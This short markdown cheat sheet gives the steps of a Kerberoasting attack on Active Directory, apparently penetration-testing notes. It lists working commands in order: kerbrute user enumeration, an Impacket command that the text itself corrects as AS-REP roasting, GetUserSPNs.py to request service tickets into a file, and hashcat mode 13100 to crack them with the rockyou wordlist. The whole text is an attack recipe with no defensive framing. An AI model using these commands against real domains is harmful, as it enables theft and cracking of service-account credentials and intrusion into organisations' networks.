## Kerberoasting Attack Steps

1. Enumerate users with `kerbrute userenum --dc <DC-IP> -d <domain> userlist.txt`
2. Request TGS for a service account (e.g., SQL) using Impacket:
GetNPUsers.py <domain>/ -usersfile users.txt -outputfile hashes.txt
(Actually that's AS-REP roasting. For Kerberoasting use `GetUserSPNs.py`.)
3. Correct command for Kerberoasting:
GetUserSPNs.py <domain>/<user>:<password> -request -outputfile kerb.txt
4. Crack with hashcat: `hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt`
